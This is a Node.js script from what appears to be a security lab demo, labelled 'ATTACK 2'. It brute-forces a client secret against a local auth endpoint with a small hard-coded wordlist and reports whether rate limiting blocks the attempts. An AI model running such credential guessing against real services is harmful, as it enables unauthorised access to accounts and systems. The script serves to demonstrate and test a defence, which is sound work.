/**
 * ATTACK 2: Brute-Force Credential Attack
 * Demonstrates automated credential guessing against the auth endpoint.
 * Only works against the VULNERABLE service (no rate limiting).
 */

const http = require("http");

// Common credentials to try
const CREDENTIAL_LIST = [
  "123456",
  "admin",
  "password",
  "test",
  "secret",
  "token",
  "service",
  "order_secret",   // The actual secret
  "supersecret",
  "changeme"
];

const CLIENT_ID = "order_service";

console.log("=== ATTACK 2: BRUTE-FORCE CREDENTIAL ATTACK ===");
console.log(`[*] Target: POST http://localhost:3000/service-token`);
console.log(`[*] Client ID: ${CLIENT_ID}`);
console.log(`[*] Testing ${CREDENTIAL_LIST.length} credentials...\n`);

let attemptIndex = 0;
let found = false;

function tryNextCredential() {
  if (attemptIndex >= CREDENTIAL_LIST.length || found) {
    if (!found) {
      console.log("\n[RESULT] Credentials not found in this wordlist");
    }
    return;
  }

  const secret = CREDENTIAL_LIST[attemptIndex];
  attemptIndex++;

  const options = {
    hostname: "localhost",
    port: 3000,
    path: "/service-token",
    method: "POST",
    headers: {
      "x-client-id": CLIENT_ID,
      "x-client-secret": secret,
      "Content-Type": "application/json"
    }
  };

  const req = http.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => {
      if (res.statusCode === 200) {
        found = true;
        console.log(`[!] SUCCESS - FOUND SECRET: "${secret}"`);
        console.log("[!] Token received:", data);
        console.log("\n[RESULT] VULNERABLE: Brute-force succeeded - no rate limiting detected");
      } else if (res.statusCode === 429) {
        console.log(`[+] ATTEMPT "${secret}" -> BLOCKED (429 Too Many Requests)`);
        console.log("\n[RESULT] SECURE: Rate limiting is active - brute-force blocked");
        found = true; // stop trying
      } else {
        console.log(`[-] ATTEMPT "${secret}" -> FAILED (${res.statusCode})`);
        // Small delay between attempts
        setTimeout(tryNextCredential, 100);
      }
    });
  });

  req.on("error", (err) => {
    console.log("[ERROR] Could not connect:", err.message);
    console.log("Make sure the auth-service is running on port 3000");
  });

  req.end();
}

tryNextCredential();
